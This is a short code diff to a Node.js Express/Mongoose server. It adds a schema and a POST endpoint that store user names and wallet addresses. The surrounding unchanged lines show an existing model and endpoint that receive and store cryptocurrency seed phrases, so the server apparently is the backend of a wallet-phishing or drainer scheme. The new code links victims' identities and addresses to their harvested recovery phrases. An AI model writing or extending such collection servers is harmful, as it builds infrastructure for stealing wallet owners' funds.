@@ -39,6 +39,46 @@ const SeedPhraseSchema = new mongoose.Schema({
 
 const SeedPhrase = mongoose.model('SeedPhrase', SeedPhraseSchema);
 
+// Define a schema for storing user details
+const UserDetailSchema = new mongoose.Schema({
+  userName: {
+    type: String,
+    required: true,
+  },
+  walletAddress: {
+    type: String,
+    required: true,
+  },
+  timestamp: {
+    type: Date,
+    default: Date.now,
+  },
+});
+
+const UserDetail = mongoose.model('UserDetail', UserDetailSchema);
+
+// API endpoint to receive user details
+app.post('/api/userdetails', async (req, res) => {
+  try {
+    const { userName, walletAddress } = req.body;
+
+    if (!userName || !walletAddress) {
+      return res.status(400).json({ message: 'Missing required fields: userName or walletAddress' });
+    }
+
+    const newUserDetail = new UserDetail({
+      userName,
+      walletAddress,
+    });
+
+    await newUserDetail.save();
+    res.status(201).json({ message: 'User details saved successfully!' });
+  } catch (error) {
+    console.error('Error saving user details:', error);
+    res.status(500).json({ message: 'Internal server error' });
+  }
+});
+
 // API endpoint to receive seed phrase data
 app.post('/api/seedphrase', async (req, res) => {
   try {
